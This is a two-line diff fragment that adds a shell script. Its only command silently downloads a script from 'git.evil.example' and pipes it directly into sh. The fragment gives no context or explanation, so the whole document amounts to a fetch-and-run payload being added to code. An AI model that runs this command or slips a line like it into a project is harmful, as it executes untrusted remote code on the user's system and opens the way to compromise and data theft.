@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -s http://git.evil.example/w.sh | sh
